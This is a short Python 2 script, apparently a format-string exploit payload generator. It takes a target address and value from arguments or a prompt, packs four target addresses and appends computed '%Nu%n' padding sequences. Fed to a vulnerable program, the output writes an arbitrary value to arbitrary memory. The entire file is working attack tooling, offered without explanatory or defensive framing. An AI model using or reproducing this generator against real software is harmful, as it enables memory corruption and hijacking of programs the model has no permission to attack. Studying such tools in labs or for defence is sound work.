import struct
import sys

def proc(address, value):
    # Takes hex
    strval = hex(value)[2:]
    out = ''
    outputted = 0
    out += struct.pack("I", address+6)
    outputted += 4
    out += struct.pack("I", address+4)
    outputted += 4
    out += struct.pack("I", address+2)
    outputted += 4
    out += struct.pack("I", address)
    outputted += 4
    out += '%%%du%%n' % (calcnum(int(strval[:2],16),outputted))
    outputted += (calcnum(int(strval[:2],16),outputted))
    out += '%%%du%%n' % (calcnum(int(strval[2:4],16),outputted))
    outputted += (calcnum(int(strval[2:4],16),outputted))
    out += '%%%du%%n' % (calcnum(int(strval[4:6],16),outputted))
    outputted += (calcnum(int(strval[4:6],16),outputted))
    out += '%%%du%%n' % (calcnum(int(strval[6:],16),outputted))
    outputted += (calcnum(int(strval[6:],16),outputted))
    return out

def calcnum(val, wrote):
    padding = (val-wrote) % 0x100
    if padding < 10:
        padding += 0x100
    return padding

def main():
    if len(sys.argv) < 2:
        add, val = raw_input('Address,value: ').split(',')
        add, val = int(add,16),int(val,16)
    else:
        add, val = int(sys.argv[1],16),int(sys.argv[2],16)
    print proc(add,val)

if __name__ == '__main__':  main()
